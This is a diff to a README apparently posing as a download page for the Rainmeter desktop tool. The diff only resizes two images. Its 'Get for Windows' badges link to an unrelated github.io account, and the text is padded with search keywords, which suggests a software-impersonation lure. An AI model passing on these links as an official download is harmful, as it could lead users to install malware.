@@ -1,6 +1,6 @@
 # Rainmeter Desktop Manager for Windows
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYEWZbemWF9uPurI3BuWungaoquAQf5SSps0W-xSKI_g&s" alt="Rainmeter Logo" width="860">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYEWZbemWF9uPurI3BuWungaoquAQf5SSps0W-xSKI_g&s" alt="Rainmeter Logo" width="660">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tashagunfighter3.github.io/.github//Rainmeter-Desktop-Manager)
 
@@ -18,7 +18,7 @@ Many users also search for **system monitor**, **rainmeter spotify**, **rainmete
 
 Designed specifically for Windows, Rainmeter combines desktop widgets, hardware monitoring, customizable skins, productivity panels, music controls, application launchers, performance tracking, and extensive personalization into a lightweight desktop platform suitable for home users, professionals, developers, content creators, and gamers.
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlTFxIl0QH1Jq2q34P9RUhwxviucWeAqZpssElHe-F6Q&s=10" width="900">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlTFxIl0QH1Jq2q34P9RUhwxviucWeAqZpssElHe-F6Q&s=10" width="600">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tashagunfighter3.github.io/.github/Rainmeter-Desktop-Manager)
 
